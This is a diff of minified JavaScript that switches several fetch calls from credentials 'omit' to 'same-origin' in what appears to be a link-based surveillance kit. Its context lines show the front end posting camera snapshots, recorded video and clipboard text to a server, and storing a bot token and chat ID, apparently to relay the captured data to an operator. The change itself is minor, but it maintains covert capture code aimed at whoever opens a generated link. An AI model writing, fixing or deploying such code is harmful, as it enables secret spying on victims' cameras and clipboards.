@@ -23,7 +23,7 @@
         r = a(9008),
         o = a.n(r);
       async function getCsrfToken() {
-        let e = await fetch("/api/csrf", { credentials: "omit" }),
+        let e = await fetch("/api/csrf", { credentials: "same-origin" }),
           t = await e.json();
         return t.csrfToken;
       }
@@ -141,7 +141,7 @@
                       });
                   })(t, e));
               }))
-            : (fetch("/api/auth/session", { credentials: "omit" })
+            : (fetch("/api/auth/session", { credentials: "same-origin" })
                 .then((e) => e.json())
                 .then((t) => {
                   t.uid ? a(t.uid) : e.push("/");
@@ -153,7 +153,7 @@
           if (!t || !r) return;
           let e = await fetch("/api/links/list", {
               headers: { "X-CSRF-Token": r },
-              credentials: "omit",
+              credentials: "same-origin",
             }),
             a = await e.json();
           d(a);
@@ -166,7 +166,7 @@
             (await fetch("/api/auth/logout", {
               method: "POST",
               headers: { "X-CSRF-Token": r },
-              credentials: "omit",
+              credentials: "same-origin",
             }),
               e.push("/"));
           },
@@ -187,7 +187,7 @@
                       "X-CSRF-Token": r,
                     },
                     body: JSON.stringify({ botToken: p, chatId: g }),
-                    credentials: "omit",
+                    credentials: "same-origin",
                   },
                 ),
                 a = await t.json();
@@ -207,7 +207,7 @@
               (await fetch("/api/links/delete?id=".concat(e), {
                 method: "DELETE",
                 headers: { "X-CSRF-Token": r },
-                credentials: "omit",
+                credentials: "same-origin",
               }),
               M());
           },
@@ -397,7 +397,7 @@
                 data: n,
                 camera: e,
               }),
-              credentials: "omit",
+              credentials: "same-origin",
             }));
         }
         async function recordVideo(e, t) {
@@ -452,7 +452,7 @@
                         camera: e,
                         duration: t,
                       }),
-                      credentials: "omit",
+                      credentials: "same-origin",
                     })),
                     a());
                 }),
@@ -502,7 +502,7 @@
                       type: "clipboard",
                       data: { text: e },
                     }),
-                    credentials: "omit",
+                    credentials: "same-origin",
                   }));
               } catch (e) {}
               (R(2), await sleep(1e3), R(3));
